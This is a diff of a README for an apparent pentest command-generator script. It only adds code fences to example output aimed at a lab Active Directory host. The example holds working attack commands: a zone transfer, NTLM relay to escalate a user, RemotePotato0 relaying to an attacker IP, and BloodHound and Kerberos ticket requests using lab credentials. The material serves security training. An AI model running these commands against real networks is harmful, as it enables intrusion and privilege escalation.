@@ -1,6 +1,6 @@
   Enter in info about a target, and the script will fill out the most common commands for you! 
   Example Output:   
-# Zone transfer (Unlikely with AD)
+```# Zone transfer (Unlikely with AD)
 dig axfr htb.local @10.10.10.161
 
 # Guest RID brute
@@ -41,7 +41,7 @@ sudo impacket-ntlmrelayx -t ldap://10.10.10.161 --no-wcf-server --escalate-user 
 .\RemotePotato0.exe -m 2 -r 10.10.14.2 -x 10.10.14.2 -p 9999 -s 1
 
 # Bloodhound Python injestor
-faketime -f +7h bloodhound-python -c ALL -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc FOREST.htb.local -ns 10.10.10.161
+faketime -f +7h bloodhound-python -c ALL -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc FOREST.htb.local -ns 10.10.10.161```
 
 # Powerview.py enumeration
 faketime -f +7h getTGT.py htb.local/svc-alfresco:'s3rvice'
